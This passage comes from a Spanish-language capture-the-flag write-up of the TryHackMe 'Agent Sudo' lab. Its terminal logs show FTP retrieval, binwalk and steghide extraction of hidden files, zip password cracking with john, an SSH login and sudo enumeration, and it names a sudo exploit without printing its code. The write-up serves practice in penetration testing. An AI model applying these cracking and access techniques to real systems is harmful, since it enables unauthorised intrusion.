&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/agentsudo# ftp 10.10.235.45
Connected to 10.10.235.45.
&lt;span class=&#34;m&#34;&gt;220&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;vsFTPd 3.0.3&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Name &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.235.45:root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;: chris
&lt;span class=&#34;m&#34;&gt;331&lt;/span&gt; Please specify the password.
Password:
&lt;span class=&#34;m&#34;&gt;230&lt;/span&gt; Login successful.
Remote system &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; ls
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Here comes the directory listing.
-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;             &lt;span class=&#34;m&#34;&gt;217&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;29&lt;/span&gt; 12:15 To_agentJ.txt
-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;           &lt;span class=&#34;m&#34;&gt;33143&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;29&lt;/span&gt; 12:22 cute-alien.jpg
-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;           &lt;span class=&#34;m&#34;&gt;34842&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;29&lt;/span&gt; 12:33 cutie.webp
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Directory send OK.
ftp&amp;gt; mget *
mget To_agentJ.txt? y
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Opening BINARY mode data connection &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; To_agentJ.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;217&lt;/span&gt; bytes&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Transfer complete.
&lt;span class=&#34;m&#34;&gt;217&lt;/span&gt; bytes received in 0.00 secs &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;1.3526 MB/s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
mget cute-alien.jpg? y
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Opening BINARY mode data connection &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; cute-alien.jpg &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;33143&lt;/span&gt; bytes&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Transfer complete.
&lt;span class=&#34;m&#34;&gt;33143&lt;/span&gt; bytes received in 0.22 secs &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;145.3596 kB/s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
mget cutie.webp? y
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Opening BINARY mode data connection &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; cutie.webp &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;34842&lt;/span&gt; bytes&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Transfer complete.
&lt;span class=&#34;m&#34;&gt;34842&lt;/span&gt; bytes received in 0.35 secs &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;95.8564 kB/s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
ftp&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;En el archivo de texto nos muestra un mensaje para el Agente J, en el que explica que la contraseña esta dentro de la imagen falsa.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/agentsudo# cat To_agentJ.txt 
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;t be a problem &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; you.

From,
Agent C
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/agentsudo/Screenshot_20200204_222550.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;stego&#34;&gt;STEGO&lt;/h2&gt;
&lt;p&gt;Utilizamos binwalk para ver el contenido de las imagenes y vemos que la imagen PNG tiene un archivo de texto.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/agentsudo/tmp# binwalk cute-alien.jpg 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;             0x0             JPEG image data, JFIF standard 1.01

root@aoiri:~/tryhackme/agentsudo/tmp# binwalk cutie.webp 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;             0x0             PNG image, &lt;span class=&#34;m&#34;&gt;528&lt;/span&gt; x 528, 8-bit colormap, non-interlaced
&lt;span class=&#34;m&#34;&gt;869&lt;/span&gt;           0x365           Zlib compressed data, best compression
&lt;span class=&#34;m&#34;&gt;34562&lt;/span&gt;         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
&lt;span class=&#34;m&#34;&gt;34820&lt;/span&gt;         0x8804          End of Zip archive, footer length: &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt;

root@aoiri:~/tryhackme/agentsudo/tmp#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Extraemos el contenido de la imagen con binwalk y encontramos un archivo comprimido que contiene el archivo de texto, utilizamos john the ripper para obtener la contraseña por fuerza bruta.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/agentsudo/tmp/_cutie.webp.extracted# zip2john 8702.zip &amp;gt; hash_zip
ver 81.9 8702.zip/To_agentR.txt is not encrypted, or stored with non-handled compression &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt;
root@aoiri:~/tryhackme/agentsudo/tmp/_cutie.webp.extracted# cat hash_zip 
8702.zip/To_agentR.txt:&lt;span class=&#34;nv&#34;&gt;$zip2$*&lt;/span&gt;0*1*0*4673cae714579045*67aa*4e&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... hash-here-dont-show-cuz-tryhackme-ban-me-:v-end ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;*$/zip2$:To_agentR.txt:8702.zip:8702.zip
root@aoiri:~/tryhackme/agentsudo/tmp/_cutie.webp.extracted# john hash_zip 
Using default input encoding: UTF-8
Loaded &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; password &lt;span class=&#34;nb&#34;&gt;hash&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ZIP, WinZip &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;PBKDF2-SHA1 256/256 AVX2 8x&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt;
Will run &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; OpenMP threads
Proceeding with single, rules:Single
Press &lt;span class=&#34;s1&#34;&gt;&amp;#39;q&amp;#39;&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; status
Almost &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: Processing the remaining buffered candidate passwords, &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; any.
Warning: Only &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; candidates buffered &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; the current salt, minimum &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; needed &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; performance.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
*****            &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;8702.zip/To_agentR.txt&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
1g 0:00:00:00 DONE 2/3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;2020-02-04 22:58&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 1.052g/s 46303p/s 46303c/s 46303C/s 123456..Peter
Use the &lt;span class=&#34;s2&#34;&gt;&amp;#34;--show&amp;#34;&lt;/span&gt; option to display all of the cracked passwords reliably
Session completed
root@aoiri:~/tryhackme/agentsudo/tmp/_cutie.webp.extracted#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Extraemos los archivos del archivo zip:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/agentsudo/tmp/_cutie.webp.extracted# 7z x 8702.zip 

7-Zip &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;64&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 16.02 : Copyright &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;locale&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;en_US.utf8,Utf16&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;on,HugeFiles&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;on,64 bits,2 CPUs Intel&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;R&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Core&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;TM&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; i5-8250U CPU @ 1.60GHz &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;806EA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,ASM,AES-NI&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;

Scanning the drive &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; archives:
&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; file, &lt;span class=&#34;m&#34;&gt;280&lt;/span&gt; bytes &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; KiB&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;

Extracting archive: 8702.zip
--
&lt;span class=&#34;nv&#34;&gt;Path&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 8702.zip
&lt;span class=&#34;nv&#34;&gt;Type&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; zip
Physical &lt;span class=&#34;nv&#34;&gt;Size&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;280&lt;/span&gt;

    
Enter password &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;will not be echoed&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;: *****
Everything is Ok    

Size:       &lt;span class=&#34;m&#34;&gt;86&lt;/span&gt;
Compressed: &lt;span class=&#34;m&#34;&gt;280&lt;/span&gt;
root@aoiri:~/tryhackme/agentsudo/tmp/_cutie.webp.extracted# ls
&lt;span class=&#34;m&#34;&gt;365&lt;/span&gt;  365.zlib  8702.zip  hash_zip  To_agentR.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Vemos un mensaje que nos muestra la contraseña de la que nos mencionaba la anterior nota:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/agentsudo/tmp/_cutie.webp.extracted# cat To_agentR.txt 
Agent C,

We need to send the picture to &lt;span class=&#34;s1&#34;&gt;&amp;#39;*******&amp;#39;&lt;/span&gt; as soon as possible!

By,
Agent R
root@aoiri:~/tryhackme/agentsudo/tmp/_cutie.webp.extracted#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizamos la contraseña (decodificada en base64) para obtener los archivos de la imagen JPG:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/agentsudo/tmp# steghide extract -sf cute-alien.jpg 
Enter passphrase: 
wrote extracted data to &lt;span class=&#34;s2&#34;&gt;&amp;#34;message.txt&amp;#34;&lt;/span&gt;.
root@aoiri:~/tryhackme/agentsudo/tmp# cat message.txt 
Hi james,

Glad you find this message. Your login password is ************

Don&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;t ask me why the password look cheesy, ask agent R who &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; this password &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; you.

Your buddy,
chris
root@aoiri:~/tryhackme/agentsudo/tmp#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;ssh---user&#34;&gt;SSH - User&lt;/h2&gt;
&lt;p&gt;Ahora que tenemos las credenciales, las utilizamos con el servicio SSH de la maquina, obtenemos nuestra shell y nuestra flag &lt;strong&gt;user.txt&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/agentsudo/Screenshot_20200204_231631.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Hacemos una enumeracion sencilla con &lt;code&gt;sudo -l&lt;/code&gt; para listar los comandos/archivos que podemos ejecutar sin contraseña y con privilegios root, vemos /bin/bash pero al intentar ejecutarlo con sudo no se ejecuta.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;james@agent-sudo:~$ sudo -l -l
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;sudo&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; password &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; james: 
Matching Defaults entries &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; james on agent-sudo:
    env_reset, mail_badpass, &lt;span class=&#34;nv&#34;&gt;secure_path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/sbin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/bin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/snap/bin

User james may run the following commands on agent-sudo:

Sudoers entry:
    RunAsUsers: ALL, !root
    Commands:
	/bin/bash
james@agent-sudo:~$ sudo /bin/bash
Sorry, user james is not allowed to execute &lt;span class=&#34;s1&#34;&gt;&amp;#39;/bin/bash&amp;#39;&lt;/span&gt; as root on agent-sudo.
james@agent-sudo:~$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Buscamos una vulnerabilidad para sudo y vemos que existe un exploit con el cual podemos obtener acceso de superusuario.&lt;/p&gt;
